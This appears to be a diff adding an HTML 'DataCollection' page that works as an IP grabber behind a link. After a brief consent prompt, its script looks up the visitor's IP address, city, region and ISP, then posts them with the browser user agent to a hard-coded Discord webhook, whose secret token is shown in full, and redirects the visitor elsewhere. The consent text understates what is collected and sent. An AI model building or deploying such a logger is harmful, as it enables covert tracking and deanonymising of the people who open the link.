@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>DataCollection</title>
+  <link rel="apple-touch-icon" href="/favicon.png">
+  <link rel="icon" type="image/png" sizes="225x225" href="/favicon.png">
+  <link rel="icon" href="/favicon.ico">
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1e1e2f, #27293d);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    p { font-size: 1.5rem; }
+
+    #agbOverlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.6);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+
+    #agbBox {
+      background: #1f1f2e;
+      padding: 25px 30px;
+      border-radius: 12px;
+      max-width: 450px;
+      width: 90%;
+    }
+
+    button {
+      padding: 8px 18px;
+      margin-top: 15px;
+      margin-right: 10px;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    #acceptBtn { background: #4caf50; color: #fff; }
+    #declineBtn { background: #f44336; color: #fff; }
+  </style>
+</head>
+
+<body>
+  <p>Please wait…</p>
+
+  <div id="agbOverlay">
+    <div id="agbBox">
+      <h2>Terms and Conditions & Privacy Policy</h2>
+      <p>
+        This page processes technical data (e.g., IP address).
+        By clicking "Accept", you consent to this processing.
+      </p>
+      <button id="acceptBtn" onclick="acceptAgb()">Accept</button>
+      <button id="declineBtn" onclick="declineAgb()">Deny</button>
+    </div>
+  </div>
+
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1457062530320171100/f-BBOUnVNOYYOfE5GWkZfnw75UcjWHG43IDMyMX-s5LXgYpMQgbY8cm4SZ7MdcL4ZZ3f";
+
+/* Zielseite */
+const params = new URLSearchParams(location.search);
+let gotoAfter = params.get("gotoafter") || "https://t3102115-cmd.github.io";
+
+/* Cookies */
+function setCookie(name, value, days = 365) {
+  const d = new Date();
+  d.setTime(d.getTime() + days*86400000);
+  document.cookie = `${name}=${value}; expires=${d.toUTCString()}; path=/`;
+}
+function getCookie(name) {
+  return document.cookie.split("; ").find(r => r.startsWith(name + "="))?.split("=")[1];
+}
+
+/* Redirect */
+function redirect() {
+  setTimeout(() => location.href = gotoAfter, 1500);
+}
+
+/* IP + GEO + WEBHOOK */
+async function logIp() {
+  try {
+    // IP holen
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+
+    // GEO-Daten holen
+    const geoRes = await fetch(`http://ip-api.com/json/${ipData.ip}`);
+    const geo = await geoRes.json();
+
+    const message =
+`Visitor accessed your site!
+IP: ${ipData.ip}
+Country: ${geo.country || "unknown"}
+Region: ${geo.regionName || "unknown"}
+City: ${geo.city || "unknown"}
+ISP: ${geo.isp || "unknown"}
+Device: ${navigator.userAgent}
+Page: ${location.href}
+GotoAfter: ${gotoAfter}
+Time: ${new Date().toISOString()}`;
+
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: message })
+    });
+
+  } catch (e) {
+    console.error("Tracking failed:", e);
+  } finally {
+    redirect();
+  }
+}
+
+/* AGB */
+function acceptAgb() {
+  setCookie("agb", "accepted");
+  document.getElementById("agbOverlay").style.display = "none";
+  logIp();
+}
+function declineAgb() {
+  setCookie("agb", "declined");
+  document.getElementById("agbOverlay").style.display = "none";
+  redirect();
+}
+
+/* Start */
+const agb = getCookie("agb");
+if (agb === "accepted") logIp();
+else if (agb === "declined") redirect();
+else document.getElementById("agbOverlay").style.display = "flex";
+</script>
+</body>
+</html>
